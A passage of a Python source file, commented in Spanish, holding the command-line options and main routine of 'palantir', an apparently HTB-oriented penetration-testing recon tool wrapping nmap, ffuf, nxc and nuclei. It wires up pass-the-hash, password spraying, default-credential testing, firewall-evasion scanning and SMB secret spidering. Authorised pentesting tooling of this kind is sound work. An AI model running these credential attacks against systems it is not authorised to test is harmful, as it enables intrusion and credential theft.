                         "Sin alias corto a propósito: -p ya es de --pass, confundirlos bajo presión "
                         "de examen cambia 'qué puertos escaneo' por 'con qué contraseña pruebo'.")
    ap.add_argument("--min-rate", type=int, default=5000,
                    help="Paquetes/segundo mínimos de nmap. Más alto = más rápido y más ruidoso (def. 5000).")
    ap.add_argument("--jobs", "-j", type=int, default=1, metavar="N",
                    help="Objetivos a escanear EN PARALELO (def. 1 = secuencial). Útil para "
                         "barrer un /24 o una lista grande sin esperar host a host. Cada objetivo "
                         "corre en su hilo, escribe su propio report.html/commands.log y sus líneas "
                         "van etiquetadas [ip]; la salida EN VIVO de nmap/ffuf de varios objetivos se "
                         "entremezcla (míralo en el informe de cada uno). Con --jobs>1 no se pregunta "
                         "nada interactivo (lo de /etc/hosts se deja indicado para añadir a mano). "
                         "No te pases: cada objetivo lanza su propio nmap/ffuf (CPU, red y ruido). "
                         "Al terminar se actualiza además <outdir>/index.html con el link a cada "
                         "report.html que haya en <outdir> (acumulativo entre sesiones, no solo los "
                         "de este run).")
    ap.add_argument("--no-sweep", dest="sweep", action="store_false",
                    help="No hacer el ping-sweep previo (nmap -sn) en CIDR/rangos: escanea TODAS las IPs "
                         "del rango aunque no respondan. Úsalo si los hosts bloquean ICMP y el sweep "
                         "te deja fuera objetivos vivos. Por defecto el sweep está ON y poda los muertos "
                         "(salvo con --tunnel, donde se desactiva solo: ICMP no atraviesa un pivot/SOCKS).")
    ap.set_defaults(sweep=True)
    ap.add_argument("--aggressive", dest="aggressive", action="store_true",
                    help="(ON por defecto) 2º nmap con scripts vuln + footprint profundo (enum4linux-ng, onesixtyone).")
    ap.add_argument("--no-aggressive", dest="aggressive", action="store_false",
                    help="Desactiva los scripts vuln y el footprint profundo (más rápido/silencioso).")
    ap.add_argument("--udp", dest="udp", action="store_true",
                    help="(ON por defecto si root) barrido UDP de los puertos clave (SNMP, IPMI…).")
    ap.add_argument("--no-udp", dest="udp", action="store_false", help="Desactiva el barrido UDP.")
    ap.set_defaults(aggressive=True, udp=True)
    ap.add_argument("--stealth", action="store_true",
                    help="nmap -T2 -f + ffuf con menos hilos/delay/UA normal. Mucho más lento.")
    ap.add_argument("--proxy", metavar="URL",
                    help="Proxy para ffuf, p. ej. http://127.0.0.1:8080 (Burp) o socks5://host:puerto.")
    ap.add_argument("--source-port", type=int, metavar="PUERTO",
                    help="Puerto de origen para nmap y el banner grabbing (evasión: firewalls que "
                         "confían en un puerto como 53/DNS). Puertos <1024 requieren root.")
    ap.add_argument("--tcp-connect", "--connect", dest="connect", action="store_true",
                    help="Fuerza connect scan (nmap -sT) aunque haya root, en vez del SYN scan "
                         "(-sS) por defecto. Útil en WSL2 mirrored + VPN de HTB, donde los SYN raw "
                         "se pierden en el túnel y nmap ve 'host up' con 0 puertos (falso negativo). "
                         "Sin esto, palantir ya reintenta solo con -sT si el SYN no encuentra nada. "
                         "Ideal en ~/.palantirrc si tu setup lo necesita siempre. (--connect sigue "
                         "funcionando como alias, por compatibilidad.)")
    ap.add_argument("--tunnel", "--pivoting", "--pivot", dest="tunnel", action="store_true",
                    help="Escaneo apto para PIVOTING / túnel (ligolo-ng, chisel, SOCKS, Meterpreter, "
                         "WSL2+VPN…). Fuerza connect scan (-sT) y cambia el timing de nmap a uno que NO "
                         "inunde el túnel: QUITA --min-rate (su ritmo fijo satura la pila TCP userland "
                         "del relay y hace que nmap marque 'filtered' puertos ABIERTOS cuyas respuestas "
                         "se perdieron) y usa --max-retries 10 (el default de nmap, el que recupera esos "
                         "probes — bajarlo a 3, como en la 1ª versión, era justo lo contrario). Mantiene "
                         "el -p- completo (por un túnel tarda varios min pero no pierde puertos, ni los "
                         "RPC dinámicos altos de un DC); con --top haces solo el top-1000 (rápido). Mucho "
                         "más rápido que --stealth y sin perder el WinRM 5985 que desaparecía por un "
                         "ligolo-ng. UDP por túnel poco fiable. Ideal en ~/.palantirrc si siempre pivotas.")
    ap.add_argument("--resume", action="store_true",
                    help="Reutiliza los XML de nmap ya existentes (no re-escanea) Y, si los puertos/"
                         "servicios no cambiaron, el footprint/searchsploit/credenciales por defecto "
                         "del findings.json anterior (no los repite): solo relanza fuzzing/informes y, "
                         "sobre todo, las credenciales APORTADAS nuevas (-u/-p/-H/-U/-P), que nunca se "
                         "saltan. Útil para iterar rápido, p. ej. probar una credencial recién encontrada.")
    ap.add_argument("--no-scripts", action="store_true",
                    help="No lanzar los scripts NSE de enumeración en la Fase 2 (solo -sV, más rápido/silencioso).")
    ap.add_argument("--no-banner", action="store_true",
                    help="Salta la Fase 4 (banner grabbing manual por socket de los puertos que nmap dejó como 'unknown').")
    ap.add_argument("--no-footprint", action="store_true", help="Salta la Fase 5 (footprinting por protocolo).")
    ap.add_argument("--no-searchsploit", action="store_true", help="Salta la Fase 5b (búsqueda de exploits con searchsploit).")
    ap.add_argument("--default-creds", "--creds", dest="default_creds", action="store_true",
                    help="Modo enfocado: SOLO prueba credenciales por defecto (verificadas) de cada servicio; "
                         "omite footprint, searchsploit, fuzzing Y los scripts vuln de --aggressive "
                         "(equivale a sumarle --no-aggressive). Incompatible con --no-creds.")
    ap.add_argument("--no-creds", action="store_true", help="No probar credenciales por defecto (salta la Fase 5c).")
    ap.add_argument("--user", "-u", metavar="USER",
                    help="Fase 5d: usuario a reutilizar contra TODOS los servicios detectados con nxc "
                         "(reutilización de credenciales). Se combina con --pass (o con --pass-list/-P).")
    ap.add_argument("--pass", "-p", dest="password", metavar="PASS",
                    help="Fase 5d: contraseña para --user (si se omite, se prueba vacía). OJO: queda en el "
                         "historial del shell y en 'ps'; en el informe va enmascarada.")
    ap.add_argument("--hash", "-H", dest="hash", metavar="NTLM",
                    help="Fase 5d: hash NTLM para PASS-THE-HASH en vez de contraseña (nxc -H). Formato "
                         "'NTHASH' o 'LMHASH:NTHASH'. Se usa con --user/-u (o --user-list/-U) y se prueba "
                         "contra cada servicio NTLM detectado (SMB/WinRM/RDP/WMI/MSSQL/LDAP) — con "
                         "--local-auth si la cuenta es local. Una credencial válida enumera el dominio igual "
                         "que --pass (shares/usuarios/grupos/roasting). Incompatible con --pass/--pass-list/"
                         "--creds-file.")
    ap.add_argument("--user-list", "-U", metavar="FICHERO",
                    help="Fase 5d: fichero con un usuario por línea ('#' comenta). Sin --pass-list/-P, cada "
                         "usuario se prueba con --pass (o vacía si tampoco la das). CON --pass-list/-P a la "
                         "vez se CRUZAN las dos listas (todas las combinaciones usuario×contraseña) — eso ya "
                         "es password spraying de verdad, no el 1-intento-por-cuenta del resto de la Fase 5d; "
                         "con listas grandes palantir comprueba la política de bloqueo si puede y pide "
                         "confirmar. Ver --no-bruteforce para emparejar en vez de cruzar.")
    ap.add_argument("--pass-list", "-P", metavar="FICHERO",
                    help="Fase 5d: fichero con una contraseña por línea ('#' comenta). Sin --user-list/-U, se "
                         "prueban contra --user (hace falta un usuario, suelto o en lista). Ver --user-list "
                         "para el cruce de las dos listas y el aviso de spraying.")
    ap.add_argument("--no-bruteforce", action="store_true",
                    help="Con --user-list/-U Y --pass-list/-P a la vez (las dos, de fichero): empareja línea "
                         "a línea (usuario[i] con contraseña[i]) en vez de cruzar TODAS las combinaciones — "
                         "N pares en vez de N×M, mucho menos ruido/riesgo de bloqueo. Pensado para "
                         "'contraseña = usuario': -U lista.txt -P lista.txt --no-bruteforce (el MISMO "
                         "fichero en los dos) prueba cada usuario con su propio nombre como contraseña. "
                         "Sin efecto si falta una de las dos listas.")
    ap.add_argument("--creds-file", metavar="FICHERO",
                    help="Fase 5d: fichero 'usuario:contraseña' (una por línea, '#' comenta) para probar "
                         "contra cada servicio detectado — p. ej. las credenciales que vayas recopilando por "
                         "el camino. Combínalo con --resume para reutilizar un escaneo ya hecho sin re-escanear. "
                         "Pares explícitos: a diferencia de --user-list/--pass-list, NO se cruza nada.")
    ap.add_argument("--local-auth", action="store_true",
                    help="Fase 5d: añade --local-auth a nxc (SMB/WinRM/RDP/WMI/MSSQL/LDAP) — hace falta cuando "
                         "el objetivo SÍ está unido a un dominio pero la credencial que pruebas es una cuenta "
                         "LOCAL de esa máquina (sin esto, nxc la valida contra el dominio y falla aunque sea "
                         "válida en local). En un Windows SUELTO (sin dominio) no hace falta: sin dominio, nxc "
                         "ya valida contra la SAM local por defecto. También se aplica al volcado automático "
                         "de SAM/LSA que dispara un (Pwn3d!) por SMB.")
    ap.add_argument("--spider", action="store_true",
                    help="SMB: spidering de CONTENIDO de los shares legibles con nxc (--spider SHARE "
                         "--content): busca secretos DENTRO de los ficheros, no solo por el nombre. Usa la "
                         "credencial aportada (-u/-p/-H) si la das, o la sesión anónima que haya entrado. "
                         "Lento en shares grandes — opt-in. Ver --pattern para afinar la búsqueda.")
    ap.add_argument("--pattern", metavar="PATRON",
                    help="Patrón(es) para --spider (nxc --pattern), separados por coma. Si no lo das, "
                         "--spider busca un regex de secretos por defecto (passw/secret/cred/claves). "
                         "Dar --pattern implica --spider.")
    ap.add_argument("--install-missing", action="store_true",
                    help="Instala las herramientas/wordlists que falten (sin preguntar): con apt las que "
                         "están en los repos, y con pip/pipx/npm o descargando un binario/fichero de "
                         "GitHub las que no (jsmith.txt, kerbrute, certipy, creds, adidnsdump, mongosh, "
                         "crt.sh — ver preflight()/_FETCHABLE_RESOURCES; siempre avisa primero qué va a "
                         "bajar y de dónde). SIN objetivo, actúa de instalador: comprueba TODO, instala y sale.")
    ap.add_argument("--check-tools", action="store_true",
                    help="Solo lista qué herramientas faltan y cómo instalarlas (no instala, no escanea) y sale.")
    ap.add_argument("--no-preflight", action="store_true",
                    help="No comprobar al arrancar las herramientas que falten (continúa directamente).")
    ap.add_argument("--add-hosts", action="store_true",
                    help="Añade los dominios/hostnames descubiertos a /etc/hosts sin preguntar (requiere root).")
    ap.add_argument("--no-add-hosts", action="store_true",
                    help="No ofrecer añadir dominios a /etc/hosts.")
    ap.add_argument("--no-fuzz", action="store_true",
                    help="Salta las Fases 5 y 6 (fuzzing de directorios y de vhosts con ffuf).")
    ap.add_argument("--no-vhost-fuzz", action="store_true",
                    help="Salta SOLO la Fase 7 (vhost fuzzing por diccionario); mantiene la Fase 6 (fuzzing de "
                         "directorios). Para scopes de bug bounty donde los hostnames están tasados y el resto "
                         "de subdominios (p. ej. '*.dominio.com') está fuera de scope explícitamente.")
    ap.add_argument("--nikto", action="store_true",
                    help="Lanza nikto DE VERDAD contra cada servicio web (Fase 5), no solo lo sugiere. "
                         "OFF por defecto: es un escaneo completo de vulnerabilidades/config conocidas, "
                         "lento (varios minutos por servicio web) y ruidoso — opt-in a propósito.")
    ap.add_argument("--cms-scan", action="store_true",
                    help="Si whatweb detecta WordPress/Joomla, lanza el escáner dedicado (wpscan/joomscan: "
                         "plugins, temas, usuarios, vulnerabilidades conocidas). OFF por defecto: lento "
                         "(varios minutos) y más ruidoso que el fingerprint normal — opt-in a propósito.")
    ap.add_argument("--crawl", action="store_true",
                    help="Crawling real con katana contra cada servicio web: sigue enlaces/JS/formularios "
                         "DE VERDAD (no adivina rutas como el diccionario de ffuf). Acotado (profundidad 2, "
                         "máx. 60 páginas) para no dispararse. OFF por defecto — opt-in.")
    ap.add_argument("--nuclei", action="store_true",
                    help="Lanza nuclei (ProjectDiscovery) contra cada servicio web: plantillas de la "
                         "comunidad para CVEs conocidos, exposiciones y malas configuraciones. Filtra la "
                         "salida a severidad low+ (descarta el ruido 'info' de detección de tecnología). "
                         "OFF por defecto: escaneo completo de plantillas, lento y ruidoso — opt-in.")
    ap.add_argument("--no-html", action="store_true", help="No generar report.html / findings.json.")
    ap.add_argument("--selftest", action="store_true",
                    help="Ejecuta las pruebas internas (sin tocar la red) y sale.")
    rc_args = _load_rc_args()
    args = ap.parse_args(rc_args + sys.argv[1:])   # ~/.palantirrc primero → la CLI gana

    if args.selftest:
        selftest(); return 0

    if args.default_creds and args.no_creds:
        ap.error("--default-creds y --no-creds son incompatibles: --default-creds pide ejecutar "
                 "SOLO la Fase 5c, --no-creds la desactiva — juntos no hacen nada útil.")
    if args.hash and (args.password is not None or args.pass_list or args.creds_file):
        ap.error("--hash/-H (pass-the-hash) no se combina con --pass/-p, --pass-list/-P ni --creds-file: "
                 "usa uno u otro (el hash va con --user/-u o --user-list/-U).")
    # -D/--domain es alias de --vhost (mismo extra_dom); si se dan los dos y DISTINTOS, error.
    try:
        args.vhost = _reconcile_domain(args.vhost, args.domain)
    except ValueError as e:
        ap.error(str(e))

    global RESUME, SNMP_WORDLIST, NIKTO, CMS_SCAN, CRAWL, CONNECT, NUCLEI, SPIDER, SPIDER_PATTERN, TUNNEL
    global USERENUM_WORDLIST, NO_USERENUM, SPRAY_PASSWORDS
    RESUME = args.resume
    NIKTO = args.nikto
    CMS_SCAN = args.cms_scan
    CRAWL = args.crawl
    TUNNEL = args.tunnel
    CONNECT = args.connect or args.tunnel   # por túnel/pivot, connect scan (-sT) siempre: el SYN raw no pasa fiable
    NUCLEI = args.nuclei
    SPIDER = args.spider or bool(args.pattern)   # --pattern implica --spider
    SPIDER_PATTERN = [s.strip() for s in args.pattern.split(",") if s.strip()] if args.pattern else None
    USERENUM_WORDLIST = args.userenum_wordlist
    NO_USERENUM = args.no_userenum
    SPRAY_PASSWORDS = [p for p in (args.spray.split(",") if args.spray else []) if p] or None
    if args.snmp_wordlist:
        SNMP_WORDLIST = args.snmp_wordlist

    specs = []
    if args.targets:
        try:
            specs += Path(args.targets).read_text().splitlines()
        except OSError as e:
            err(f"no pude leer {args.targets}: {e}"); return 1
    if args.target:
        specs += re.split(r"[,\s]+", args.target.strip())

    # Modo standalone de herramientas (sin escanear): --check-tools siempre, o
    # --install-missing SIN objetivo. Comprueba TODO, instala/lista, y sale.
    if args.check_tools or (args.install_missing and not specs):
        print(BANNER)
        if args.check_tools and args.install_missing:
            info("--check-tools tiene prioridad sobre --install-missing: solo listo, no instalo nada.")
        if not shutil.which("nmap"):
            warn("nmap NO está instalado (es la única herramienta obligatoria): apt install nmap")
        preflight(args, check_all=True, check_only=args.check_tools)
        return 0

    if not specs:
        ap.error("hace falta un objetivo (IP/CIDR/rango/hostname), --targets FICHERO, o --selftest")
    targets = expand_targets(specs)
    if not targets:
        err("ningún objetivo válido tras expandir las especificaciones."); return 1
    if not shutil.which("nmap"):
        err("nmap no está en el PATH."); return 1
    if not is_root():
        warn("Sin root: connect scan (-sT), más lento; UDP no disponible.")

    print(BANNER)
    if rc_args:
        info(f"~/.palantirrc aplicado: {' '.join(rc_args)}")
    if args.resume:
        warn("Modo --resume: reutilizo lo que YA haya en la carpeta de resultados (XML de nmap, footprint, "
             "credenciales por defecto); lo que falte o no exista se escanea/calcula de cero — si es un "
             "objetivo nuevo sin datos previos, equivale a un escaneo normal.")
    if args.stealth:
        warn("Modo sigiloso: nmap a -T2/fragmentado y ffuf con delay — todo mucho más lento.")
    if args.tunnel:
        info("Modo --tunnel/--pivoting: connect scan (-sT) + timing apto para túnel (sin --min-rate, "
             "--max-retries 10) para no perder puertos por un pivot (ligolo-ng/chisel/SOCKS).")
        # --tunnel SOLO ajusta el escaneo (scan-type/timing/paralelismo); NO enruta nada por sí
        # mismo. El cómo llega el tráfico al objetivo lo pones tú: por RUTA (ligolo-ng añade una
        # interfaz TUN L3, sshuttle hace NAT transparente → corres palantir normal y el SO enruta
        # todo: nmap, banners, nxc, ffuf) o por SOCKS (chisel socks / ssh -D / proxychains →
        # tienes que envolver TODO palantir con `proxychains palantir ...`; si no, solo ffuf con
        # --proxy iría por el pivot y el resto saldría por tu interfaz directa).
        info("  --tunnel ajusta el escaneo, NO enruta: por RUTA (ligolo-ng/sshuttle) corre palantir "
             "normal; por SOCKS (chisel/ssh -D) envuélvelo con `proxychains palantir …` (si no, solo "
             "ffuf con --proxy va por el pivot).")
        if not args.top and not args.port:
            info("  → barrido -p- completo: por un túnel tarda varios minutos pero no pierde puertos "
                 "(ni los RPC dinámicos altos de un DC, 49xxx). Si solo quieres los habituales rápido, añade --top (top-1000).")
        warn("  UDP por túnel es poco fiable (muchos relays ni lo pasan).")
        if args.source_port:
            # --source-port falsea el puerto de ORIGEN de la conexión real a Nmap/sockets propios
            # (útil para un firewall que confía en 53/DNS, p. ej.) — pero si --tunnel se envuelve
            # con un proxy SOCKS (proxychains, el caso típico), la conexión real sale de PROXYCHAINS
            # hacia el proxy, no de nmap hacia el objetivo: el puerto de origen que llega al otro
            # lado del pivot es el que el SOCKS/el pivot decida, nunca el que --source-port pidió.
            # No es nada que palantir pueda arreglar (es como funciona un proxy SOCKS), así que
            # solo se avisa para no dar una falsa sensación de que el truco del firewall sigue vivo.
            warn("  --source-port con --tunnel: si el pivot va detrás de un proxy SOCKS (proxychains), "
                 "el puerto de origen que llega al objetivo lo decide el proxy/pivot, NO --source-port "
                 "(la conexión real sale de proxychains hacia el proxy, no de nmap hacia el objetivo) "
                 "— el truco del firewall-que-confía-en-53 no sobrevive al salto SOCKS.")
        if args.sweep and any(_is_multihost_spec(s) for s in specs):
            # Fase 0 (nmap -sn) depende de ICMP echo/timestamp + un SYN/ACK crudo a 80/443 — ninguno
            # de los dos atraviesa un pivot de verdad: un proxy SOCKS (proxychains, el caso más
            # habitual delante de --tunnel) solo reenvía TCP vía connect() normal, nunca paquetes
            # ICMP/raw sueltos; y aunque el pivot sea un túnel L3 (ligolo-ng/chisel) sin SOCKS de
            # por medio, nmap sin privilegios raw sobre esa interfaz cae a probes que tampoco son
            # fiables salto a través. Resultado SIN este aviso: el -sn no encuentra NADA vivo en el
            # CIDR/rango, se descartan TODOS los objetivos como "muertos" y el run entero aborta
            # (antes de intentar siquiera el escaneo real, donde SÍ habrían respondido). Por eso
            # --tunnel se trata como --no-sweep automático — ver el `and not args.tunnel` de la Fase 0.
            warn("  Fase 0 (ping-sweep -sn) desactivada automáticamente: por un pivot el -sn no es fiable. "
                 "Por SOCKS/proxychains o sshuttle el ICMP/SYN-crudo ni pasa (daría 'todos muertos' y "
                 "abortaría el run); por ligolo-ng (L3) puede pasar pero da falsos positivos (su agente "
                 "no reenvía paquetes crudos). Se escanean todos sin filtrar — más lento en un /24, pero "
                 "no se pierde ningún vivo.")
        if args.jobs > 1:
            # --tunnel baja la agresividad de UN escaneo para no saturar la pila TCP userland
            # del relay; --jobs>1 lanza N nmaps a la vez por el MISMO túnel → lo sobre-suscriben
            # (el control de congestión de nmap es por proceso, no se coordinan entre hilos) y
            # vuelves a perder puertos, justo lo que --tunnel evita. Peor aún con SOCKS/ligolo:
            # muchos connect() en paralelo agotan la tabla de conexiones del relay.
            warn(f"--tunnel + --jobs {args.jobs}: escanear {args.jobs} objetivos a la vez por el MISMO túnel lo "
                 "satura y volverás a perder puertos (el motivo por el que existe --tunnel). Por un pivot usa "
                 "--jobs 1 (secuencial); si urge barrer muchos, mejor secuencial + --top que meter paralelismo.")
    elif args.connect:
        info("Modo --tcp-connect: connect scan (nmap -sT) aunque haya root.")
    if args.default_creds:
        info("Modo --default-creds: SOLO credenciales por defecto (se omiten footprint, searchsploit, fuzzing y scripts vuln).")
        args.no_fuzz = True
        args.no_searchsploit = True
        args.aggressive = False
    # Fase 0: en un CIDR/rango, barrer primero quién está vivo (nmap -sn) y podar los muertos
    # — si no, cada IP del rango se come un -p- completo aunque no exista (una /24 con 50 vivas
    # = 200 escaneos tirados). Solo poda IPs que SALEN del rango; las IPs sueltas/hostnames
    # escritos a mano se escanean siempre (una box de HTB no responde a ping, por eso -Pn).
    sweep_specs = [s for s in specs if _is_multihost_spec(s)]
    if args.sweep and sweep_specs and not args.resume and not args.tunnel:
        live = host_discovery(sweep_specs, source_port=args.source_port)
        if live is not None:
            sweepable = _sweepable_ips(specs)
            before = len(targets)
            targets = [(ip, name) for (ip, name) in targets
                       if name or ip not in sweepable or ip in live]
            pruned = before - len(targets)
            if pruned:
                good(f"Fase 0: {len(live)} host(s) vivo(s); descarto {pruned} que no respondieron "
                     "(si bloquean ICMP y los quieres igual, reescanea con --no-sweep).")
            if not targets:
                err("ningún host del rango respondió al ping-sweep (todos filtrados). "
                    "Si bloquean ICMP/ping, reintenta con --no-sweep."); return 1
    folders = target_folders(targets)   # namespacea <outdir>/<ip>_<nombre>/ solo si colisiona la ip
    confirm_creds_spray(args, targets)   # --user-list/--pass-list grandes: avisa/confirma UNA vez, no por objetivo

    if not preflight(args):          # avisa/instala/aborta si faltan herramientas, ANTES de tocar nada
        return 1

    # Resumen de fases activas (por defecto se hace TODO lo recomendado; desactiva con --no-*)
    phases = ["descubrimiento+enum"]
    if args.aggressive:
        phases.append("scripts-vuln+footprint-profundo")
    if not args.no_footprint and not args.default_creds:
        phases.append("footprint")
    if not args.no_creds:
        phases.append("credenciales-por-defecto")
    if parse_provided_creds(args):
        phases.append("credenciales-aportadas")
    if not args.no_searchsploit:
        phases.append("searchsploit")
    if not args.no_fuzz:
        phases.append("fuzz-web/vhost")
    if args.udp and is_root():
        phases.append("udp")
    good("Fases activas: " + ", ".join(phases))
    if not args.no_creds and not args.default_creds:
        info("(las credenciales por defecto van SIEMPRE salvo --no-creds; usa --default-creds para SOLO eso)")
    if len(targets) > 1:
        shown = ", ".join(t for t, _ in targets[:10]) + (" …" if len(targets) > 10 else "")
        info(f"{len(targets)} objetivos: {shown}")

    jobs = min(max(1, args.jobs), len(targets))   # al menos 1, nunca más que objetivos

    # Secuencial (--jobs 1, por defecto): comportamiento de siempre, salida limpia y prompts.
    if jobs <= 1:
        rc = 0
        for tip, tname in targets:
            if len(targets) > 1:
                label = tip + (f" ({tname})" if tname else "")
                print(f"\n{C_BOLD}{C_CYAN}{'█' * 8} {label} {'█' * 8}{C_RESET}")
            try:
                if not _run_one_guarded(tip, tname, args, folder=folders[(tip, tname)]):
                    rc = 1
            except KeyboardInterrupt:
                err("interrumpido por el usuario."); return 130
        if not args.no_html:
            write_index(args.outdir)
        return rc

    # Paralelo (--jobs N): un hilo por objetivo, salida etiquetada [ip], sin prompts.
    args._noninteractive = True
    warn(f"--jobs {jobs}: escaneo hasta {jobs} objetivos a la vez. Las líneas van etiquetadas "
         "[ip]; la salida EN VIVO de nmap/ffuf se entremezcla (cada objetivo deja su propio "
         "report.html/commands.log). Sin preguntas interactivas.")
    sys.stdout = _TaggedStdout(sys.stdout)
    sys.stderr = _TaggedStdout(sys.stderr)

    def _worker(tip, tname):
        _TLS.tag = f"{C_GREY}[{tip}]{C_RESET} "
        return _run_one_guarded(tip, tname, args, folder=folders[(tip, tname)])

    rc = 0
    ex = concurrent.futures.ThreadPoolExecutor(max_workers=jobs)
    futs = [ex.submit(_worker, tip, tname) for tip, tname in targets]
    try:
        for fut in concurrent.futures.as_completed(futs):
            if not fut.result():
                rc = 1
    except KeyboardInterrupt:
        err("interrumpido por el usuario; cancelo lo que no haya empezado "
            "(los escaneos en curso terminan y dejan su informe)…")
        ex.shutdown(wait=False, cancel_futures=True)
        return 130
    ex.shutdown(wait=True)
    if not args.no_html:
        write_index(args.outdir)
    return rc


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        err("interrumpido por el usuario."); sys.exit(130)